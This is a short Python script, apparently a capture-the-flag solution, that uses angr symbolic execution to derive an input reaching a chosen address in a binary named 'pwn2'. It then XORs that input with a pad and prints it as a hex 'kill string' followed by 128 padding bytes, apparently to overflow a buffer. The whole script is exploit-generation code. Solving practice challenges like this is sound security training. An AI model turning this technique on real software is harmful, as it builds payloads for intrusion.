import angr
import find
from pwn import *

tar = 'pwn2'

# Find dynamic sections in file
loc = find.get_addresses(tar)

# Create symbolic buffer
p = angr.Project(tar)
buf = angr.claripy.BVS("buf",0x40*8)
start_state = p.factory.blank_state(addr=loc['start'])
start_state.memory.store(loc['buf'], buf)

# Setup a stack frame
start_state.regs.rbp = start_state.regs.rsp
start_state.regs.rsp = start_state.regs.rsp - 0x50
start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))

# Setup stepper
pg = p.factory.path_group(start_state)
def step_func(pg):
    print pg
    pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
    pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
    return pg
pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
print pg.errored
f = pg.found[0]
print f.state
print f.state.se.any_str(buf).encode('hex')

# Create killstring
kill_str = f.state.se.any_str(buf)
kill_str = xor(kill_str, loc['pad'], cut = 'max')
print 'Here is some poison:'
print kill_str.encode('hex') + 'a' * 128





